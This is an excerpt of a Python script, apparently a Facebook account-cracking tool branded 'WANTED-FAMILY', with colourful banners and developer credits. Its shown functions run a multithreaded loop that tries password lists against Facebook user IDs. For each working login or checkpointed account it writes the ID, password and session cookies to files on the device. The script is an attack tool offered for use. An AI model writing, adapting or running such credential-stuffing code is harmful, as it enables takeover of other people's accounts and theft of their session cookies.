...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mAB RAHMAN×SAJIB\33[1;91m⊁ ')
...
def vivo():
    ...
    return ua
#-----------------------------------------------------#
os.system('xdg-open https://api.whatsapp.com/send?phone=+8801778869540')
logo1 = f"""{W}
{B}╔╦═╦╦══╦═╦╦══╦═╦══╗{R}      {G}╔══╦══╦═╦═╦══╦╗╔═╦╗
{B}║║║║║╔╗║║║╠╗╔╣╦╩╗╗║{R} ═╗ ╦ {G}║═╦╣╔╗║║║║╠║║╣║╚╗║║
{G}║║║║║╠╣║║║║║║║╩╦╩╝║{R} ╔╩╦╝ {B}║╔╝║╠╣║║║║╠║║╣╚╦╩╗║
{G}╚═╩═╩╝╚╩╩═╝╚╝╚═╩══╝{R} ╩ ╚═ {B}╚╝─╚╝╚╩╩═╩╩══╩═╩══╝{R}V/1.3
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m
{G}[{M}+{G}]{G} DEVELOPER   {M}●\033[1;97m {G}𝗔𝗕 𝗥𝗔𝗛𝗠𝗔𝗡 × SAJIB
{G}[{M}+{G}] {G}FACEBOOK    {M}●\033[1;97m {G}Md.Abdur Rahman 󱢏     
{G}[{M}+{G}] {G}FACEBOOK    {M}●\033[1;97m {G}SAJIB HOSSAIN
{G}[{M}+{G}] {G}GITHUB      {M}●\033[1;97m WANTED-FAMILY-127
{G}[{M}+{G}] {G}TEAM        {M}●\033[1;97m WANTED-FAMILY      
{G}[{M}+{G}] {G}TOOL        {M}●\033[1;97m    (\033[1;32mTEST\033[1;97m)
{G}[{M}+{G}] {G}TOOL VIRSION{M}●\033[1;36m 1.3
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m"""
...
class apvroval:
    def check():
        url = "https://github.com/AbdurRahman-127/Wanted-Family/blob/main/Wanted-Family.txt"
        url = "https://github.com/wantedfamily59/Wanted---Family-/blob/main/Wanted%20-%20Family.text"
        import mechanize
...
class Main:
    def Awm():
        ...
        elif awm in ['3']:os.system('xdg-open https://github.com/AbdurRahman-127')
...
def Awm_File():
   ...
   #     print(f"TOTAL OK ID SAVE IN : {G}/sdcard/WF-OK.txt{W}")
   #     print(f"TOTAL CP ID SAVE IN : {R}/sdcard/WF-CP..txt{W}")
...
class Akash:
    def nepal():
        ...
        with tred(max_workers=35) as My_Tanisha:
            ...
            print(f"TOTAL OK ID SAVE IN : {G}/sdcard/WANTED-OK..txt{W}")
            print(f"TOTAL CP ID SAVE IN : {R}/sdcard/WANTED-CP.txt{W}")
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{M}[{G}WF-LIVE{M}]{W}<>{M}[{Y}%s{M}]{W}<>{M}[{G}ALIVE:%s{M}]'%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r{G}[WF-OK] {ids} | {pas}')
                open('/sdcard/WF-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{Y}[WANTED-CP] {ids} | {pas}')
                open('/sdcard/WF-CP..txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    ...
    try:
        for pas in passlist:
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[WANTED-OK.] {uid} | {pas}')
                open('/sdcard/WANTED-OK..txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
                ...
                open('/sdcard/WANTED-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
